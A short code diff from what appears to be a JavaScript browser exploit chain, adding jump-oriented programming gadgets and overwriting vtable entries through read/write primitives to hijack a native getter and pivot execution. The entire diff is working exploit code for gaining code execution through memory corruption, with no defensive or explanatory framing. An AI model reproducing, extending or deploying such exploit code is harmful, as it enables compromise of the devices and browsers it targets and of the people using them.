@@ -97,6 +97,15 @@ call qword ptr [rax + 0x28]
 // later. So we pop the return address pushed by jop1.
 //
 // This will make pivoting back easy, just "leave; ret".
+const ta_jop2 = `
+pop rsi
+jmp qword ptr [rax + 0x1c]
+`;
+const ta_jop3 = `
+mov rdi, qword ptr [rax + 8]
+mov rax, qword ptr [rdi]
+jmp qword ptr [rax + 0x30]
+`;
 const jop2 = `
 pop rsi
 jmp qword ptr [rax + 0x1c]
@@ -530,6 +539,8 @@ class Chain900 extends Chain900Base {
 
         // 0x1b8 is the offset of the scrollLeft getter native function
         rw.write64(vtable_clone, 0x1b8, this.get_gadget(ta_jop1));
+        rw.write64(vtable, 0xb8, this.get_gadget(ta_jop2));
+        rw.write64(vtable, 0x1c, this.get_gadget(ta_jop3));
 
         // for the JOP chain
         const rax_ptrs = new Uint8Array(0x100);
